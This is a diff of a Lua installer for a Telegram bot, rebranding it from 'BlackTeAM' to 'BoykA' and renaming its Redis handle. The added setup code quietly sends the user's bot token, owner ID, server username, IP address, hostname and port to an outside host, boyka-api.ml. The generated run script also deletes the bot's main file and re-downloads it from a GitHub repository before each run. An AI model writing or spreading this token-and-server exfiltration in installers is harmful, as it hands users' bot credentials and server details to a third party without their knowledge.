@@ -1,4 +1,4 @@
-database=dofile("./File/redis.lua").connect("127.0.0.1", 6379)
+redis=dofile("./File/redis.lua").connect("127.0.0.1", 6379)
 serpent=dofile("./File/serpent.lua")
 JSON=dofile("./File/dkjson.lua")
 json=dofile("./File/JSON.lua")
@@ -16,7 +16,7 @@ local Create_Info = function(Token,Sudo)
 local Write_Info_Sudo = io.open("sudo.lua", 'w')
 Write_Info_Sudo:write([[
 
-s = "BGBBB"
+s = "BOYKA-DeV"
 
 q = "BoykA"
 
@@ -27,7 +27,7 @@ Sudo = ]]..Sudo..[[
 ]])
 Write_Info_Sudo:close()
 end  
-if not database:get(Server_Done.."Token_Write") then
+if not redis:get(Server_Done.."Token_Write") then
 print("\27[1;34m»» Send Your Token Bot :\27[m")
 local token = io.read()
 if token ~= '' then
@@ -36,18 +36,18 @@ if res ~= 200 then
 io.write('\n\27[1;31mSorry The Token is not Correct \n\27[0;39;49m')
 else
 io.write('\n\27[1;31mThe Token Is Saved\n\27[0;39;49m')
-database:set(Server_Done.."Token_Write",token)
+redis:set(Server_Done.."Token_Write",token)
 end 
 else
 io.write('\n\27[1;31mThe Tokem was not Saved\n\27[0;39;49m')
 end 
 os.execute('lua start.lua')
 end
-if not database:get(Server_Done.."UserSudo_Write") then
+if not redis:get(Server_Done.."UserSudo_Write") then
 print("\27[1;34mSend Your Id Sudo :\27[m")
 local Id = io.read():gsub(' ','') 
 if tostring(Id):match('%d+') then
-data,res = https.request("https://black-source.tk/BlackTeAM/index.php?bn=info&id="..Id)
+data,res = https.request("https://boyka-api.ml/index.php?bn=info&id="..Id)
 if res == 200 then
 muaed = json:decode(data)
 if muaed.Info.info == 'Is_Spam' then
@@ -56,7 +56,7 @@ os.execute('lua start.lua')
 end ---ifBn
 if muaed.Info.info == 'Ok' then
 io.write('\n\27[1;31m The Id Is Saved\n\27[0;39;49m')
-database:set(Server_Done.."UserSudo_Write",Id)
+redis:set(Server_Done.."UserSudo_Write",Id)
 end ---ifok
 else
 io.write('\n\27[1;31mThe Id was not Saved\n\27[0;39;49m')
@@ -65,14 +65,13 @@ os.execute('lua start.lua')
 end ---ifnot
 end
 local function Files_Info_Get()
-Create_Info(database:get(Server_Done.."Token_Write"),database:get(Server_Done.."UserSudo_Write"))   
-local t = json:decode(https.request('https://black-source.tk/BlackTeAM/index.php?n=BK&id='..database:get(Server_Done.."UserSudo_Write").."&token="..database:get(Server_Done.."Token_Write").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time))
-print("::BOYKA::")
-local RunBot = io.open("BoykA", 'w')
+Create_Info(redis:get(Server_Done.."Token_Write"),redis:get(Server_Done.."UserSudo_Write"))   
+local t = json:decode(https.request('https://boyka-api.ml/index.php?n=by&id='..redis:get(Server_Done.."UserSudo_Write").."&token="..redis:get(Server_Done.."Token_Write").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time))
+local RunBot = io.open("Run", 'w')
 RunBot:write([[
 #!/usr/bin/env bash
 cd $HOME/BoykA
-token="]]..database:get(Server_Done.."Token_Write")..[["
+token="]]..redis:get(Server_Done.."Token_Write")..[["
 rm -fr BoykA.lua
 wget "https://raw.githubusercontent.com/BOYKA-DeV/BoykA/BoykA/BoykA.lua"
 while(true) do
@@ -81,31 +80,20 @@ rm -fr ../.telegram-cli
 done
 ]])
 RunBot:close()
-local RunTs = io.open("ts", 'w')
+local RunTs = io.open("BA", 'w')
 RunTs:write([[
 #!/usr/bin/env bash
 cd $HOME/BoykA
 while(true) do
 rm -fr ../.telegram-cli
 screen -S BoykA -X kill
-screen -S BoykA ./BoykA
+screen -S BoykA ./Run
 done
 ]])
 RunTs:close()
-local Fa = io.open("Fa", 'w')
-Fa:write([[
-#!/usr/bin/env bash
-cd $HOME/BoykA
-rm -rf $HOME/.telegram-cli
-sudo chmod +x tg
-chmod +x BoykA
-chmod +x ts
-./ts
-]])
-Fa:close()
 end
 Files_Info_Get()
-database:del(Server_Done.."Token_Write");database:del(Server_Done.."UserSudo_Write")
+redis:del(Server_Done.."Token_Write");redis:del(Server_Done.."UserSudo_Write")
 sudos = dofile('sudo.lua')
 os.execute('./install.sh ins')
 end 
@@ -116,7 +104,7 @@ AutoFiles_Write()
 var = true
 else   
 f:close()  
-database:del(Server_Done.."Token_Write");database:del(Server_Done.."UserSudo_Write")
+redis:del(Server_Done.."Token_Write");redis:del(Server_Done.."UserSudo_Write")
 sudos = dofile('sudo.lua')
 os.execute('./install.sh ins')
 var = false
